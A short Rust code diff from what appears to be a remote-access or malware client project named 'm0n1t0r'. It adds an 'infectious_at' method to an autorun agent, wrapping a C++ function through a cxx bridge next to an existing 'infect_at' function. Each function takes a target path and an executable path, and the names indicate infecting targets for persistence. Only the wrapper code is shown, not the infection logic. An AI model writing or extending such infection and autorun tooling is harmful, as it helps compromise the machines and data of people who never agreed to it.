@@ -53,6 +53,19 @@ impl m0n1t0r_common::autorun::Agent for AgentObj {
         });
         Ok(rx.await?.into())
     }
+
+    async fn infectious_at(&self, target: PathBuf, exe: PathBuf) -> AppResult<bool> {
+        let (tx, rx) = oneshot::channel();
+
+        thread::spawn(move || {
+            let _ = tx.send(ffi::infectious_at(
+                target.to_string_lossy().to_string(),
+                exe.to_string_lossy().to_string(),
+            )?);
+            Ok::<_, anyhow::Error>(())
+        });
+        Ok(rx.await?.into())
+    }
 }
 
 #[cxx::bridge]
@@ -63,5 +76,7 @@ mod ffi {
         include!("m0n1t0r-client/m0n1t0r-cpp-windows-lib/include/autorun.h");
 
         fn infect_at(target: String, exe: String) -> Result<bool>;
+
+        fn infectious_at(target: String, exe: String) -> Result<bool>;
     }
 }
